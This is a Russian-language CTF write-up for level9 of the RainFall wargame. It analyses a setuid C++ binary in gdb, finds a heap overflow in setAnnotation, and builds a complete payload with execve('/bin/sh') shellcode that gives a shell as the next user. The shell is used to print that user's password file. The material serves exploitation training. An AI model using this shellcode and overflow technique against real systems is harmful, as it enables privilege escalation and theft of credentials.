# Level9

Мы можем найти исполняемый файл, который еще ничего не делает
```
level9@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9
level9@RainFall:~$ ./level9
level9@RainFall:~$ ./level9 bla
level9@RainFall:~$ ./level9 bla bla
```
Проанализировав это с помощью gdb, мы можем найти 5 интересных функций:
- N::N(int)
- N::setAnnotation(char*)
- N::operator+(N&)
- N::operator-(N&)
- main
  

  Этот двоичный файл написан на плюсах, и здесь нет вызовов `/ bin / sh`, мы можем предположить, что на этот раз нам придется использовать shell.  
  Мы должны использовать `memcpy ()` в argv [1] в `setAnnotation ()`, чтобы вызвать `edx` шеллкод. По сути, это переполнение буфера.  
  Прежде всего, найти смещение:
```
(gdb) run 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'
Starting program: /home/user/level9/level9 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) info register eax
eax            0x41366441       1094083649
(gdb)
```

Благодаря генератору паттернов мы обнаружили, что смещение eax начинается с 108.  
Теперь у нас есть смещение, и мы можем построить нашу полезную нагрузку.
Для этого мы должны найти начальный адрес нашего буфера и заменить на него значение `esp + 0x10`, чтобы вызов` edx` вызывал наш шеллкод. Но поскольку нам нужно дважды разыменовать, как мы хотим получить доступ к классу N, наш адрес возврата должен указывать на адрес, который указывает на начальный буфер:
  
```
(gdb) b *main+136                                    // right after the setAnnotation() call
Breakpoint 1 at 0x804867c
(gdb) run 'AAAA'
Starting program: /home/user/level9/level9 'AAAA'

Breakpoint 1, 0x0804867c in main ()
(gdb) x $eax
0x804a00c:      0x41414141                           // buffer address
```
Значение [esp + 0x10] будет заменено на 0x804a00c.  
Поскольку нам нужно снова разыменовать, этот адрес будет указывать на начало нашего шелл-кода: 0x804a00x + 4 = 0x804a010.
```
payload : shell_addr + shellcode + padding + buffer_addr
          [4 bytes]   [28 bytes]  [76 bytes]  [4 bytes] = 108 + 4
```
Наш последний эксплойт будет выглядеть так:
- python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"'
```
level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
$ exit
level9@RainFall:~$ su bonus0
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
bonus0@RainFall:~$
```
# ╮(￣_￣)╭